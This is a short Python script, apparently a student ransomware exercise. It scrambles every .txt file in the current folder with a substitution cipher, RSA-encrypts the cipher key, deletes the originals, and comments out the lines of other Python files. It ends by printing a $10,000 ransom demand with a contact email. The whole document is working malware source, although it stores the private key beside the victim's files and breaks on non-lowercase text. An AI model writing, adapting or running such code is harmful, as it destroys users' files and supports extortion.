from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad
from Crypto.Random import get_random_bytes
import os
import random
import glob
from Crypto.PublicKey import RSA



def generate_priv_pub_key(key):
    #generate private key
    key = RSA.generate(2048)
    private_key = key.export_key()
    file_out = open("ransomprvkey.pem", "wb")
    file_out.write(private_key)
    file_out.close()

    #generate public key
    public_key = key.publickey().export_key()
    file_out = open("receiver.pem", "wb")
    file_out.write(public_key)
    file_out.close()
    

def getSymKey():
    return get_random_bytes(16)

def askingForRansom():
    print("Your text files are encrypted. To decrypt them, you need to pay me $10,000 and send key.bin in your folder to yqt817@uowmail.edu.au")

### Import Public/receiver key + encrypt key using RSA + sent to key.bin###
def rsaEncryptionOnSubKey(key):
    #symkey = getSymKey()
    recipient_key = RSA.import_key(open("receiver.pem").read())
    file_out = open("key.bin", "wb")

    cipher_rsa = PKCS1_OAEP.new(recipient_key)
    enc_data = cipher_rsa.encrypt(str.encode(key))
    file_out.write(enc_data)
    file_out.close()

### encrypt file to .enc + delete text file + comment all lines ###
def encrypt_files(file_txt, cyphertext):
    file_enc = file_txt[:-4] + ".enc"
    file_in = open(file_enc, "wb")
    file_in.write(str.encode(cyphertext))
    file_in.close()

    
    #remove txt file
    if os.path.exists(file_txt):
      os.remove(file_txt)
    else:
      print("The file does not exist")
    
    open_current_file = ""


    
    #comment all lines of current python file
    for file in glob.glob("*.py"):
        if file not in ["encryption.py", "file_recovery.py", "key_recovery.py"]:
                open_current_file = open(file,'r') #open file
                file_contents = open_current_file.readlines()
                file_contents = ["#" + line for line in file_contents] #copy every line and add a # in front
                open_current_file.close()
                out =  open(file,'w')
                out.writelines(file_contents)
                out.close()
    

    

### Returns the randomtable ###
def getRandomTable(alphabet):
    alphabet = list(alphabet)
    random.shuffle(alphabet)
    return ''.join(alphabet)

### Getting Cipher Text using Substitution###
def substitutionCypher(key, plaintext, alphabet): 
    dic = {}
    for i in range(len(alphabet)):
        dic[alphabet[i]] = key[i]

    #print(dic)
    ciphertext = ""
    for j in plaintext:
        ciphertext += dic[j]
    
    return ciphertext
    




### Code Execution Begins Here ####
if __name__ == "__main__":

    ### get files containning .txt ###
    array_txt_files = []
    for file in os.listdir(os.getcwd()):
        if file.endswith(".txt"):
            #print(file)
            array_txt_files.append(file)
            
    alphabet = "abcdefghijklmnopqrstuvwxyz"

    #generates key
    key = getRandomTable(alphabet)

    #generate priv pub keys
    generate_priv_pub_key(key)
    
    #encrypt key into encrypted key using RSA encryption
    rsaEncryptionOnSubKey(key)
    #print(key)
    for i in array_txt_files:
        open_txt_file = open(i,"r")
        content = open_txt_file.read()
        open_txt_file.close()
        #print(content)
        e = substitutionCypher(key, content, alphabet)
        #print(e)

        encrypt_files(i, e)
    askingForRansom()



